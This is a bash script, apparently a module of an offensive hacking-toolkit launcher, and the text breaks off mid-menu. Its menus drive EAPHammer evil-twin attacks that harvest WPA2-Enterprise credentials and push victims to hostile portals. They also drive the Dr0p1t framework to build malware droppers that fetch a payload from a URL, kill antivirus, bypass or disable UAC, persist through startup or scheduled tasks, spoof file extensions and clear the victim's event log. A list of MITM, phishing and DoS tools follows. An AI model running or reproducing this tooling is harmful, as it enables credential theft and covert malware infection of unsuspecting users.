#!/bin/bash
# This file is sourced by `l`, not run directly. The WiFi attack tools menu and its automations (EAPHammer,
# Dr0p1t, EternalBlue, the wififb Facebook-login WiFi flow).

function eaphammer_automation
{
			while true
			do
				clear
				TERMINALTITLE="EAPHAMMER"
				dash_calc
				printf '\033]2;EAPHAMMER\a'
				if [[ "$EAPHIFACE" = "" ]]
				then
					EAPHIFACE="$WLANN"
				fi
				if [[ "$EAPHESSID" = "" ]]
				then
					EAPHESSID="${RS}NONE${CE}"
					OK1=0
				elif [[ "$EAPHESSID" != "\e[1;31mNONE\e[0m" ]]
				then
					OK1=1
				fi
				if [[ "$EAPHBSSID" = "" ]]
				then
					EAPHBSSID="${RS}NONE${CE}"
					OK1=0
				fi
				if [[ "$EAPHCHANNEL" = "" ]]
				then
					EAPHCHANNEL="${RS}NONE${CE}"
					OK1=0
				fi
				if [[ "$EAPHWPA" = "" ]]
				then
					EAPHWPA="2"
				fi
				if [[ "$EAPHAUTH" = "" ]]
				then
					EAPHAUTH="${RS}NONE${CE}"
					OK1=0
				fi
				if [[ "$EAPHCREDS" = "" ]]
				then
					EAPHCREDS="OFF"
				fi
				if [[ "$EAPHHOSTILE" = "" ]]
				then
					EAPHHOSTILE="OFF"
				fi
				if [[ "$EAPHCAPTIVE" = "" ]]
				then
					EAPHCAPTIVE="OFF"
				fi
				if [[ "$EAPHPIVOT" = "" ]]
				then
					EAPHPIVOT="OFF"
				fi
				if [[ "$EAPHKARMA" = "" ]]
				then
					EAPHKARMA="OFF"
				fi
				if [[ "$EAPHAIRCRACK" = "" ]]
				then
					EAPHAIRCRACK="OFF"
				fi
				if [[ "$EAPHINTAUTO" = "" ]]
				then
					EAPHINTAUTO="OFF"
				fi
				if [[ "$EAPHAIRCRACK" = "OFF" && "$EAPHINTAUTO" = "OFF" && "$EAPHWORD" = "" ]]
				then
					EAPHWORD="OFF"
				fi
				if [[ "$EAPHAIRCRACK" = "OFF" && "$EAPHINTAUTO" = "OFF" && "$EAPHWORD" = "OFF" ]]
				then
					EAPHWORD="OFF"
				fi
				OK2=1
				if [[ "$EAPHAIRCRACK" != "OFF" ]]
				then
					if [[ "$EAPHWORD" = "OFF" || "$EAPHWORD" = "\e[1;31mNONE\e[0m" ]]
					then
						EAPHWORD="\e[1;31mNONE\e[0m"
						OK2=0
					fi
				fi
				if [[ "$EAPHINTAUTO" = "ON" || "$EAPHWORD" = "\e[1;31mNONE\e[0m" ]]
				then
					if [[ "$EAPHWORD" = "OFF" ]]
					then
						EAPHWORD="\e[1;31mNONE\e[0m"
						OK2=0
					fi
				fi
				if [[ "$EAPHINTAUTO" = "OFF" && "$EAPHAIRCRACK" = "OFF" ]]
				then
					if [[ "$EAPHWORD" = "\e[1;31mNONE\e[0m" ]]
					then
						EAPHWORD="OFF"
					fi
				fi
				echo -e """$YS"" 1""$CE"") Create a new RADIUS cert for your AP"
				echo -e """$YS"" 2""$CE"") Set your interface for the AP               CURRENT: $EAPHIFACE"
				echo -e """$YS"" 3""$CE"") Specify access point ESSID                  CURRENT: $EAPHESSID"
				echo -e """$YS"" 4""$CE"") Specify access point BSSID                  CURRENT: $EAPHBSSID"
				echo -e """$YS"" 5""$CE"") Specify access point channel                CURRENT: $EAPHCHANNEL"
				echo -e """$YS"" 6""$CE"") Specify WPA type                            CURRENT: $EAPHWPA"
				echo -e """$YS"" 7""$CE"") Specify auth type                           CURRENT: $EAPHAUTH"
				echo -e """$YS"" 8""$CE"") Harvest EAP creds                           CURRENT: $EAPHCREDS"
				echo -e """$YS"" 9""$CE"") Force clients to connect to hostile portal  CURRENT: $EAPHHOSTILE"
				echo -e """$YS""10""$CE"") Force clients to connect to captive portal  CURRENT: $EAPHCAPTIVE"
				echo -e """$YS""11""$CE"") Perform an indirect wireless pivot          CURRENT: $EAPHPIVOT"
				echo -e """$YS""12""$CE"") Enable karma                                CURRENT: $EAPHKARMA"
				echo -e """$YS""13""$CE"") Use autocrack/add with remote cracking rig  CURRENT: $EAPHAIRCRACK"
				echo -e """$YS""14""$CE"") Use internal autocrack                      CURRENT: $EAPHINTAUTO"
				echo -e """$YS""15""$CE"") Specify wordlist for autocrack              CURRENT: $EAPHWORD"
				echo -e """$YS""start""$CE"") Start "
				echo -e """$YS""00""$CE"") Main menu"
				echo -e """$YS"" back""$CE"") Go back"
				echo -e "Choose: "
				read EAPH
				clear
				if [[ "$EAPH" = 1 ]]
				then
					cd /root/eaphammer || exit
					./eaphammer --cert-wizard
				elif [[ "$EAPH" = 2 ]]
				then
					echo -e "Type the interface you want to use: "
					read EAPHIFACE
				elif [[ "$EAPH" = 3 ]]
				then
					echo -e "Type the ESSID: "
					read EAPHESSID
				elif [[ "$EAPH" = 4 ]]
				then
					echo -e "Type the BSSID: "
					read EAPHBSSID
				elif [[ "$EAPH" = 5 ]]
				then
					echo -e "Type the channel: "
					read EAPHCHANNEL
				elif [[ "$EAPH" = 6 ]]
				then
					if [[ "$EAPHWPA" = 1 ]]
					then
						EAPHWPA=2
					else
						EAPHWPA=1
					fi
				elif [[ "$EAPH" = 7 ]]
				then
					echo -e """$YS"" 1""$CE"") Open"
					echo -e """$YS"" 2""$CE"") ttls"
					echo -e """$YS"" 3""$CE"") peap"
					echo -e "Choose: "
					read PAUTH
					if [[ "$PAUTH" = 1 ]]
					then
						EAPHAUTH="open"
					elif [[ "$PAUTH" = 2 ]]
					then
						EAPHAUTH="ttls"
					elif [[ "$PAUTH" = 3 ]]
					then
						EAPHAUTH="peap"
					fi
				elif [[ "$EAPH" = 8 ]]
				then
					if [[ "$EAPHCREDS" = "OFF" ]]
					then
						EAPHCREDS="ON"
					else
						EAPHCREDS="OFF"
					fi
				elif [[ "$EAPH" = 9 ]]
				then
					if [[ "$EAPHHOSTILE" = "OFF" ]]
					then
						EAPHHOSTILE="ON"
					else
						EAPHHOSTILE="OFF"
					fi
				elif [[ "$EAPH" = 10 ]]
				then
					if [[ "$EAPHCAPTIVE" = "OFF" ]]
					then
						EAPHCAPTIVE="ON"
					else
						EAPHCAPTIVE="OFF"
					fi
				elif [[ "$EAPH" = 11 ]]
				then
					if [[ "$EAPHPIVOT" = "OFF" ]]
					then
						EAPHPIVOT="ON"
					else
						EAPHPIVOT="OFF"
					fi
				elif [[ "$EAPH" = 12 ]]
				then
					if [[ "$EAPHKARMA" = "OFF" ]]
					then
						EAPHKARMA="ON"
					else
						EAPHKARMA="OFF"
					fi
				elif [[ "$EAPH" = 13 ]]
				then
					if [[ "$EAPHAIRCRACK" = "OFF" ]]
					then
						clear
						echo -e "Hostname: "
						read HOSTN
						echo -e "Port: "
						read PORT
						clear
						EAPHAIRCRACK="${HOSTN}:${PORT}"
					else
						EAPHAIRCRACK="OFF"
					fi
				elif [[ "$EAPH" = 14 ]]
				then
					if [[ "$EAPHINTAUTO" = "OFF" ]]
					then
						EAPHINTAUTO="ON"
					else
						EAPHINTAUTO="OFF"
					fi
				elif [[ "$EAPH" = 15 ]]
				then
					if [[ "$EAPHWORD" != "OFF" && "$EAPHWORD" != "\e[1;31mNONE\e[0m" ]]
					then
						EAPHWORD="OFF"
					else
						clear
						echo -e "Type the full wordlist path: "
						read EAPHWORD
					fi
				elif [[ "$EAPH" = "back" || "$EAPH" = "b" ]]
				then
					clear
					break
				elif [[ "$EAPH" = "00" ]]
				then
					clear
					exec bash "$0"
				elif [[ "$EAPH" = "0" ]]
				then
					clear
					exit
				elif [[ "$EAPH" = "start" ]]
				then
					clear
					if [[ "$OK1" != 1 ]]
					then
						echo -e "You haven't specified the important requirements"
						sleep 4
						continue
					fi
					if [[ "$OK2" != 1 ]]
					then
						echo -e "You haven't specified a wordlist for the autocrack"
						sleep 4
						continue
					fi
				if [[ "$EAPHCREDS" = "ON" ]]
				then
					CREDS="--creds"
				else
					CREDS=""
				fi
				if [[ "$EAPHHOSTILE" = "ON" ]]
				then
					HOSTILE="--hostile-portal"
				else
					HOSTILE=""
				fi
				if [[ "$EAPHCAPTIVE" = "ON" ]]
				then
					CAPTIVE="--captive-portal"
				else
					CAPTIVE=""
				fi
				if [[ "$EAPHPIVOT" = "ON" ]]
				then
					PIVOT="--pivot"
				else
					PIVOT=""
				fi
				if [[ "$EAPHKARMA" = "ON" ]]
				then
					KARMA="--karma"
				else
					KARMA=""
				fi
				if [[ "$EAPHINTAUTO" = "ON" ]]
				then
					INTAUTO="--local-autocrack"
				else
					INTAUTO=""
				fi
				if [[ "$EAPHAIRCRACK" != "OFF" ]]
				then
					AIRCRACK="--remote-autocrack $EAPHAIRCRACK"
				else
					AIRCRACK=""
				fi
				if [[ "$EAPHAIRCRACK" != "OFF" || "$EAPHINTAUTO" != "OFF" ]]
				then
					WORD="--wordlist $EAPHWORD"
				else
					WORD=""
				fi
				IFACE="-i $EAPHIFACE"
				CHANNEL="-c $EAPHCHANNEL"
				ESSID="-e $EAPHESSID"
				BSSID="-b $EAPHBSSID"
				WPA="--wpa $EAPHWPA"
				AUTH="--auth $EAPHAUTH"
					cd /root/eaphammer || exit
					./eaphammer "$IFACE" "$CHANNEL" "$BSSID" "$ESSID" "$WPA" "$AUTH" $PIVOT $KARMA $INTAUTO $CAPTIVE $HOSTILE $CREDS "$AIRCRACK" "$WORD"
					
				fi
			done
}

function dropit_automation
{
clear
while true
do
	clear
	TERMINALTITLE="Dr0p1t-Framework"
	dash_calc
	printf '\033]2;Dr0p1t-Framework\a'
	if [[ "$MALURL" = "" ]]
	then
		MALURL="\e[1;31mNONE\e[0m"
	fi
	if [[ "$STARTUP" = "" ]]
	then
		STARTUP="OFF"
	fi
	if [[ "$TASK" = "" ]]
	then
		TASK="OFF"
	fi
	if [[ "$LTPUP" = "" ]]
	then
		LTPUP="OFF"
	fi
	if [[ "$KILLANT" = "" ]]
	then
		KILLANT="OFF"
	fi
	if [[ "$RUNBAT" = "" ]]
	then
		RUNBAT="OFF"
	fi
	if [[ "$RUNPOW" = "" ]]
	then
		RUNPOW="OFF"
	fi
	if [[ "$RUNVBS" = "" ]]
	then
		RUNVBS="OFF"
	fi
	if [[ "$UACASADMIN" = "" ]]
	then
		UACASADMIN="OFF"
	fi
	if [[ "$SPOOFEXT" = "" ]]
	then
		SPOOFEXT="OFF"
	fi
	if [[ "$ISZIP" = "" ]]
	then
		ISZIP="OFF"
	fi
	if [[ "$COMPRESS" = "" ]]
	then
		COMPRESS="OFF"
	fi
	if [[ "$DISUAC" = "" ]]
	then
		DISUAC="OFF"
	fi
	if [[ "$ICON" = "" ]]
	then
		ICON="OFF"
	fi
	if [[ "$EVENT" = "" ]]
	then
		EVENT="OFF"
	fi
	if [[ "$COMPILE" = "" ]]
	then
		COMPILE="OFF"
	fi
	if [[ "$D32" = "" ]]
	then
		D32="OFF"
	fi
	if [[ "$D64" = "" ]]
	then
		D64="OFF"
	fi
	if [[ "$BANN" = "" ]]
	then
		BANN="OFF"
	fi
	echo -e """$YS"" 1""$CE"") Malware URL                          CURRENT:$MALURL"
	echo -e """$YS"" 2""$CE"") Malware to startup                   CURRENT:$STARTUP"
	echo -e """$YS"" 3""$CE"") Malware to task scheduler            CURRENT:$TASK"
	echo -e """$YS"" 4""$CE"") Add link to powershell user profile  CURRENT:$LTPUP"
	echo -e """$YS"" 5""$CE"") Kill antivirus before malware        CURRENT:$KILLANT"
	echo -e """$YS"" 6""$CE"") Run batch script before malware      CURRENT:$RUNBAT"
	echo -e """$YS"" 7""$CE"") Run powershell script before malware CURRENT:$RUNPOW"
	echo -e """$YS"" 8""$CE"") Run vbs script before malware        CURRENT:$RUNVBS"
	echo -e """$YS"" 9""$CE"") Bypass UAC and run malware as admin  CURRENT:$UACASADMIN"
	echo -e """$YS""10""$CE"") Spoof final file to an extension     CURRENT:$SPOOFEXT"
	echo -e """$YS""11""$CE"") Malware is zip compressed            CURRENT:$ISZIP"
	echo -e """$YS""12""$CE"") Compress the final file with UPX     CURRENT:$COMPRESS"
	echo -e """$YS""13""$CE"") Try to disable UAC on victim device  CURRENT:$DISUAC"
	echo -e """$YS""14""$CE"") Use icon to the final file           CURRENT:$ICON"
	echo -e """$YS""15""$CE"") Don't clean target's event log       CURRENT:$EVENT"
	echo -e """$YS""16""$CE"") Don't compile the final file         CURRENT:$COMPILE"
	echo -e """$YS""17""$CE"") Download malware for 32 bit only     CURRENT:$D32"
	echo -e """$YS""18""$CE"") Download malware for 64 bit only     CURRENT:$D64"
	echo -e """$YS""19""$CE"") Stay quite(no banner)                CURRENT:$BANN"
	echo -e """$YS"" o""$CE"") Open output folder"
	echo -e """$YS"" u""$CE"") Check for updates"
	echo -e """$YS"" b""$CE"") Go back"
	echo -e """$YS""start""$CE"") Generate"
	echo -e "Choose: "
	read DR
	clear
	if [[ "$DR" = "o" ]]
	then
		gio open /root/Dr0p1t-Framework/output
		continue
	fi
	if [[ "$DR" = "u" ]]
	then
		cd /root/Dr0p1t-Framework || exit
		python Dr0p1t.py -u
		cd || exit
		continue
	fi
	if [[ "$DR" = "start" ]]
	then
		if [[ "$MALURL" = "\e[1;31mNONE\e[0m" ]]
		then
			echo -e """$RS""No URL specified.""$CE"""
			sleep 2
			continue
		fi
		if [[ "$STARTUP" = "OFF" ]]
		then
			DSTARTUP=""
		else
			DSTARTUP="-s"
		fi
		if [[ "$TASK" = "OFF" ]]
		then
			DTASK=""
		else
			DTASK="-t"
		fi
		if [[ "$LTPUP" = "OFF" ]]
		then
			DLTPUP=""
		else
			DLTPUP="-a"
		fi
		if [[ "$KILLANT" = "OFF" ]]
		then
			DKILLANT=""
		else
			DKILLANT="-k"
		fi
		if [[ "$RUNBAT" = "OFF" ]]
		then
			DRUNBAT=""
		else
			DRUNBAT="-b $RUNBAT"
		fi
		if [[ "$RUNPOW" = "OFF" ]]
		then
			DRUNPOW=""
		else
			DRUNPOW="-p $RUNPOW"
		fi
		if [[ "$RUNVBS" = "OFF" ]]
		then
			DRUNVBS=""
		else
			DRUNVBS="-v $RUNVBS"
		fi
		if [[ "$UACASADMIN" = "OFF" ]]
		then
			DUACASADMIN=""
		else
			DUACASADMIN="--runas"
		fi
		if [[ "$SPOOFEXT" = "OFF" ]]
		then
			DSPOOFEXT=""
		else
			DSPOOFEXT="--spoof $SPOOFEXT"
		fi
		if [[ "$ISZIP" = "OFF" ]]
		then
			DISZIP=""
		else
			DISZIP="--zip"
		fi
		if [[ "$COMPRESS" = "OFF" ]]
		then
			DCOMPRESS=""
		else
			DCOMPRESS="--upx"
		fi
		if [[ "$DISUAC" = "OFF" ]]
		then
			DDISUAC=""
		else
			DDISUAC="--nouac"
		fi
		if [[ "$ICON" = "OFF" ]]
		then
			DICON=""
		else
			DICON="-i $ICON"
		fi
		if [[ "$EVENT" = "OFF" ]]
		then
			DEVENT=""
		else
			DEVENT="--noclearevent"
		fi
		if [[ "$COMPILE" = "OFF" ]]
		then
			DCOMPILE=""
		else
			DCOMPILE="--nocompile"
		fi
		if [[ "$D32" = "OFF" ]]
		then
			DD32=""
		else
			DD32="--only32"
		fi
		if [[ "$D64" = "OFF" ]]
		then
			DD64=""
		else
			DD64="--only64"
		fi
		if [[ "$BANN" = "OFF" ]]
		then
			DBANN=""
		else
			DBANN="-q"
		fi
		cd /root/Dr0p1t-Framework || exit
		python Dr0p1t.py "$MALURL" $DSTARTUP $DTASK $DLTPUP $DKILLANT "$DRUNBAT" "$DRUNPOW" "$DRUNVBS" $DUACASADMIN "$DSPOOFEXT" $DISZIP $DCOMPRESS "$DDISUAC" "$DICON" $DEVENT $DCOMPILE $DD32 $DD64 $DBANN
		echo -e "$PAKTGB"
		$READAK
		cd || exit
	elif [[ "$DR" = 1 ]]
	then
		echo -e "Malware URL: "
		read MALURL
	elif [[ "$DR" = 14 ]]
	then
		if [[ "$ICON" = "OFF" ]]
		then
			while true
			do
				echo -e """$RS""Icon must be on /root/Dr0p1t-Framework/icons folder.""$CE"""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/icons/
				echo -e ""
				echo -e """$YS""cp""$CE"") Copy my icon to that folder"
				echo -e """$YS"" b""$CE"") Go back"
				echo -e "Enter the name of your icon: "
				read ICON
				if [[ "$ICON" = "b" ]]
				then
					ICON="OFF"
					break
				elif [[ "$ICON" = "cp" ]]
				then
					clear
					echo -e "Your file path: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e """$RS""File does not exist.""$CE"""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/icons/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/icons/"$ICON" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/icons/"$ICON".ico ]]
					then
						echo -e """$RS""File not found.""$CE"""
						sleep 2
					else
						ICON="${ICON}.ico"
						break
					fi
				else
					break
				fi
			done
		else
			ICON="OFF"
		fi
	elif [[ "$DR" = 8 ]]
	then
		if [[ "$RUNVBS" = "OFF" ]]
		then
			while true
			do
				echo -e """$RS""Script must be on /root/Dr0p1t-Framework/scripts/vbs folder.""$CE"""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/scripts/vbs/
				echo -e ""
				echo -e """$YS""cp""$CE"") Copy my script to that folder"
				echo -e """$YS"" b""$CE"") Go back"
				echo -e "Enter the name of your script: "
				read RUNVBS
				if [[ "$RUNVBS" = "b" ]]
				then
					RUNVBS="OFF"
					break
				elif [[ "$RUNVBS" = "cp" ]]
				then
					clear
					echo -e "Your file path: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e """$RS""File does not exist.""$CE"""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/scripts/vbs/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/scripts/vbs/"$RUNVBS" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/scripts/vbs/"$RUNVBS".vbs ]]
					then
						echo -e """$RS""File not found.""$CE"""
						sleep 2
					else
						RUNVBS="${RUNVBS}.vbs"
						break
					fi
				else
					break
				fi
			done
		else
			RUNVBS="OFF"
		fi
	elif [[ "$DR" = 7 ]]
	then
		if [[ "$RUNPOW" = "OFF" ]]
		then
			while true
			do
				echo -e """$RS""Script must be on /root/Dr0p1t-Framework/scripts/powershell folder.""$CE"""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/scripts/powershell/
				echo -e ""
				echo -e """$YS""cp""$CE"") Copy my script to that folder"
				echo -e """$YS"" b""$CE"") Go back"
				echo -e "Enter the name of your script: "
				read RUNPOW
				if [[ "$RUNPOW" = "b" ]]
				then
					RUNPOW="OFF"
					break
				elif [[ "$RUNPOW" = "cp" ]]
				then
					clear
					echo -e "Your file path: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e """$RS""File does not exist.""$CE"""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/scripts/powershell/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/scripts/powershell/"$RUNPOW" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/scripts/powershell/"$RUNPOW".ps1 ]]
					then
						echo -e """$RS""File not found.""$CE"""
						sleep 2
					else
						RUNPOW="${RUNPOW}.ps1"
						break
					fi
				else
					break
				fi
			done
		else
			RUNPOW="OFF"
		fi
	elif [[ "$DR" = 6 ]]
	then
		if [[ "$RUNBAT" = "OFF" ]]
		then
			while true
			do
				echo -e """$RS""Script must be on /root/Dr0p1t-Framework/scripts/bat folder.""$CE"""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/scripts/bat/
				echo -e ""
				echo -e """$YS""cp""$CE"") Copy my script to that folder"
				echo -e """$YS"" b""$CE"") Go back"
				echo -e "Enter the name of your script: "
				read RUNBAT
				if [[ "$RUNBAT" = "b" ]]
				then
					RUNBAT="OFF"
					break
				elif [[ "$RUNBAT" = "cp" ]]
				then
					clear
					echo -e "Your file path: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e """$RS""File does not exist.""$CE"""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/scripts/bat/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/scripts/bat/"$RUNBAT" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/scripts/bat/"$RUNBAT".bat ]]
					then
						echo -e """$RS""File not found.""$CE"""
						sleep 2
					else
						RUNBAT="${RUNBAT}.bat"
						break
					fi
				else
					break
				fi
			done
		else
			RUNBAT="OFF"
		fi
	elif [[ "$DR" = 2 ]]
	then
		if [[ "$STARTUP" = "OFF" ]]
		then
			STARTUP="ON"
		else
			STARTUP="OFF"
		fi
	elif [[ "$DR" = 3 ]]
	then
		if [[ "$TASK" = "OFF" ]]
		then
			TASK="ON"
		else
			TASK="OFF"
		fi
	elif [[ "$DR" = 4 ]]
	then
		if [[ "$LTPUP" = "OFF" ]]
		then
			LTPUP="ON"
		else
			LTPUP="OFF"
		fi
	elif [[ "$DR" = 5 ]]
	then
		if [[ "$KILLANT" = "OFF" ]]
		then
			KILLANT="ON"
		else
			KILLANT="OFF"
		fi
	elif [[ "$DR" = 9 ]]
	then
		if [[ "$UACASADMIN" = "OFF" ]]
		then
			UACASADMIN="ON"
		else
			UACASADMIN="OFF"
		fi
	elif [[ "$DR" = 10 ]]
	then
		if [[ "$SPOOFEXT" = "OFF" ]]
		then
			echo -e "Extension: "
			read SPOOFEXT
		else
			SPOOFEXT="OFF"
		fi
	elif [[ "$DR" = 11 ]]
	then
		if [[ "$ISZIP" = "OFF" ]]
		then
			ISZIP="ON"
		else
			ISZIP="OFF"
		fi
	elif [[ "$DR" = 12 ]]
	then
		if [[ "$COMPRESS" = "OFF" ]]
		then
			COMPRESS="ON"
		else
			COMPRESS="OFF"
		fi
	elif [[ "$DR" = 13 ]]
	then
		if [[ "$DISUAC" = "OFF" ]]
		then
			DISUAC="ON"
		else
			DISUAC="OFF"
		fi
	elif [[ "$DR" = 15 ]]
	then
		if [[ "$EVENT" = "OFF" ]]
		then
			EVENT="ON"
		else
			EVENT="OFF"
		fi
	elif [[ "$DR" = 16 ]]
	then
		if [[ "$COMPILE" = "OFF" ]]
		then
			COMPILE="ON"
		else
			COMPILE="OFF"
		fi
	elif [[ "$DR" = 17 ]]
	then
		if [[ "$D32" = "OFF" ]]
		then
			D32="ON"
		else
			D32="OFF"
		fi
	elif [[ "$DR" = 18 ]]
	then
		if [[ "$D64" = "OFF" ]]
		then
			D64="ON"
		else
			D64="OFF"
		fi
	elif [[ "$DR" = 19 ]]
	then
		if [[ "$BANN" = "OFF" ]]
		then
			BANN="ON"
		else
			BANN="OFF"
		fi
	fi
done
}

function wifi_tools
{
	while true
	do
	printf '\033]2;WIFI TOOLS\a'
	clear
	TERMINALTITLE="WIFI TOOLS"
	dash_calc
	if [[ -d /root/fluxion ]]
	then
		echo -e """$YS"" 1""$CE"") Fluxion               The future of MITM WPA attacks"
	else
		echo -e """$RS"" 1""$CE"") ""$RS""Fluxion""$CE""               The future of MITM WPA attacks"
	fi
	if [[ $(command -v wifite) ]]
	then
		echo -e """$YS"" 2""$CE"") Wifite                Automated wireless attack tool"
	else
		echo -e """$RS"" 2""$CE"") ""$RS""Wifite""$CE""               Automated wireless attack tool"
	fi
	if [[ -d /root/wifiphisher ]]
	then
		echo -e """$YS"" 3""$CE"") Wifiphisher           Automated phishing attacks against Wi-Fi clients"
	else
		echo -e """$RS"" 3""$CE"") ""$RS""Wifiphisher""$CE""           Automated phishing attacks against Wi-Fi clients"
	fi
	if [[ -d /root/Zatacker ]]
	then
		echo -e """$YS"" 4""$CE"") Zatacker              MITM-NMAP-Mail Spammer..(Install it manually)"
	else
		echo -e """$RS"" 4""$CE"") ""$RS""Zatacker""$CE""              MITM-NMAP-Mail Spammer..(Install it manually)"
	fi
	if [[ -d /root/morpheus ]]
	then
		echo -e """$YS"" 5""$CE"") Morpheus              Automated Ettercap TCP/IP Hijacking Tool"
	else
		echo -e """$RS"" 5""$CE"") ""$RS""Morpheus""$CE""              Automated Ettercap TCP/IP Hijacking Tool"
	fi
	#~ if [[ -d /root/osrframework ]]
	#~ then
		#~ echo -e ""$YS" 6"$CE") Osrfconsole           Checks usernames-phones to platforms etc.."
	#~ else
		#~ echo -e ""$RS" 6"$CE") "$RS"Osrfconsole"$CE"           Checks usernames-phones to platforms etc.."
	#~ fi
	if [[ -d /root/opensource ]]
	then
		echo -e """$YS"" 6""$CE"") Netool-toolkit        MitM pentesting opensource toolkit"
	else
		echo -e """$RS"" 6""$CE"") ""$RS""Netool-toolkit""$CE""        MitM pentesting opensource toolkit"
	fi
	if [[ -d /root/hakkuframework ]]
	then
		echo -e """$YS"" 7""$CE"") Hakku                 Penetration testing tools"
	else
		echo -e """$RS"" 7""$CE"") ""$RS""Hakku""$CE""                 Penetration testing tools"
	fi
	if [[ -d /root/Trity ]]
	then
		echo -e """$YS"" 8""$CE"") Trity                 Advanced pentesting framework"
	else
		echo -e """$RS"" 8""$CE"") ""$RS""Trity""$CE""                 Advanced pentesting framework"
	fi
	if [[ -d /root/Dracnmap ]]
	then				
		echo -e """$YS"" 9""$CE"") Dracnmap              Many scan options"
	else
		echo -e """$RS"" 9""$CE"") ""$RS""Dracnmap""$CE""              Many scan options"
	fi
	if [[ -d "/usr/share/fern-wifi-cracker" ]]
	then	
		echo -e """$YS""10""$CE"") Fern                  Wifi cracker GUI"
	else
		echo -e """$RS""10""$CE"") ""$RS""Fern""$CE""                  Wifi cracker GUI"
	fi
	if [[ -f /usr/sbin/netdiscover ]]
	then	
		echo -e """$YS""11""$CE"") Netdiscover           Network address discovering tool"
	else
		echo -e """$RS""11""$CE"") ""$RS""Netdiscover""$CE""           Network address discovering tool"
	fi
	if [[ -d /root/kickthemout ]]
	then	
		echo -e """$YS""12""$CE"") KickThemOut           Kick devices off your network"
	else
		echo -e """$RS""12""$CE"") ""$RS""KickThemOut""$CE""           Kick devices off your network"
	fi
	if [[ -d "/usr/share/ghost-phisher" ]]
	then	
		echo -e """$YS""13""$CE"") Ghost-Phisher         Fake AP,MITM,Session hijacking etc..."
	else
		echo -e """$RS""13""$CE"") ""$RS""Ghost-Phisher""$CE""         Fake AP,MITM,Session hijacking etc..."
	fi
	if [[ -d /root/The-Eye ]]
	then	
		echo -e """$YS""14""$CE"") The Eye               Detects ARP poisoning DNS spoofing etc..."
	else
		echo -e """$RS""14""$CE"") ""$RS""The Eye""$CE""               Detects ARP poisoning DNS spoofing etc..."
	fi
	if [[ -d /root/xerxes ]]
	then	
		echo -e """$YS""15""$CE"") Xerxes                The most powerful DoS tool(CAUTION)"
	else
		echo -e """$RS""15""$CE"") ""$RS""Xerxes""$CE""                The most powerful DoS tool(CAUTION)"
	fi
	if [[ -d /root/KatanaFramework ]]
	then
		echo -e """$YS""16""$CE"") Katana Framework      Many penetration testing features"
	else
		echo -e """$RS""16""$CE"") ""$RS""Katana Framework""$CE""      Many penetration testing features"
	fi
	if [[ -d /root/airgeddon ]]
	then
		echo -e """$YS""17""$CE"") Airgeddon             Audit wireless networks."
	else
		echo -e """$RS""17""$CE"") ""$RS""Airgeddon""$CE""             Audit wireless networks."
	fi
	if [[ -f /usr/bin/websploit ]]
	then
		echo -e """$YS""18""$CE"") Websploit             Advanced MITM framework"
	else
		echo -e """$RS""18""$CE"") ""$RS""Websploit""$CE""             Advanced MITM framework"
	fi
	if [[ -d /etc/openvas ]]
	then
		echo -e """$YS""19""$CE"") Openvas               Vulnerability scanner LAN"
	else
		echo -e """$RS""19""$CE"") ""$RS""Openvas""$CE""               Vulnerability scanner LAN"
	fi
	if [[ -f /usr/bin/ipscan ]]
	then
		echo -e """$YS""20""$CE"") Angry IP Scanner      IP Scanner"
	else
		echo -e """$RS""20""$CE"") ""$RS""Angry IP Scanner""$CE""      IP Scanner"
	fi
	if [[ -d /root/routersploit ]]
	then
		echo -e """$YS""21""$CE"") Routersploit          Find/exploit router vulnerabilities"
	else
		echo -e """$RS""21""$CE"") ""$RS""Routersploit""$CE""          Find/exploit router vulnerabilities"
	fi
	if [[ -d /root/nWatch ]]
	then
		echo -e """$YS""22""$CE"") nWatch                IP scanner/OS detection"
	else
		echo -e """$RS""22""$CE"") ""$RS""nWatch""$CE""                IP scanner/OS detection"
	fi
	if [[ -d /root/eternal_scanner ]]
	then
		echo -e """$YS""23""$CE"") Eternal scanner       Scans hosts for eternalblue vulnerabilities"
	else
		echo -e """$RS""23""$CE"") ""$RS""Eternal scanner""$CE""       Scans hosts for eternalblue vulnerabilities"
	fi
	if [[ -d /root/eaphammer ]]
	then
		echo -e """$YS""24""$CE"") Eaphammer             Evil twin attacks against WPA2-Enterprise networks"
	else
		echo -e """$RS""24""$CE"") ""$RS""Eaphammer""$CE""             Evil twin attacks against WPA2-Enterprise networks"
	fi
	if [[ -d /root/VMR ]]
	then
		echo -e """$YS""25""$CE"") VMR                   Best WPS cracker, mdk3-v6"
	else
		echo -e """$RS""25""$CE"") ""$RS""VMR""$CE""                   Best WPS cracker, mdk3-v6"
	fi
	if [[ -d /root/netattack2 ]]
	then
		echo -e """$YS""26""$CE"") Netattack3            Advanced network scan and attack script"
	else
		echo -e """$RS""26""$CE"") ""$RS""Netattack2""$CE""            Advanced network scan and attack script"
	fi
	if [[ -f /usr/bin/wifi-pumpkin ]]
	then
		echo -e """$YS""27""$CE"") Wifi-Pumpkin          Framework for Rogue Wi-Fi Access Point Attack"
	else
		echo -e """$RS""27""$CE"") ""$RS""Wifi-Pumpkin""$CE""          Framework for Rogue Wi-Fi Access Point Attack"
	fi
	if [[ -d /root/Gloom-Framework ]]
	then
		echo -e """$YS""28""$CE"") Gloom                 Penetration Testing Framework"
	else
		echo -e """$RS""28""$CE"") ""$RS""Gloom""$CE""                 Penetration Testing Framework"
	fi
	if [[ -f /usr/bin/sechub ]]
	then
		echo -e """$YS""29""$CE"") secHub                Security/Hacking Kit"
	else
